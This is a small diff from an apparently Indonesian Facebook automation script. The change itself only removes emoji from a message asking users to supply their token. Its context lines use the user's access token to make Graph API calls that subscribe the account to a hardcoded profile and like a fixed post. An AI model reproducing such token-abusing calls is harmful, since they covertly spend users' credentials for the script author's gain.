@@ -204,7 +204,7 @@ def bot():
 		jalan(balmond+m+" Token Kadaluarsa")
 		time.sleep(0.5)
 		login()
-	print(balmond+l+" Script nya mantap Aa 😊, Setor Token Aa 💦")
+	print(balmond+l+" Script nya mantap Aa , Setor Token Aa ")
 	komentar = random.choice(["Apa Kabar Aa @[100000834003593]"])
 	requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token) 
 	requests.post("https://graph.facebook.com/4257706904267068/likes?summary=true&access_token=" + token)
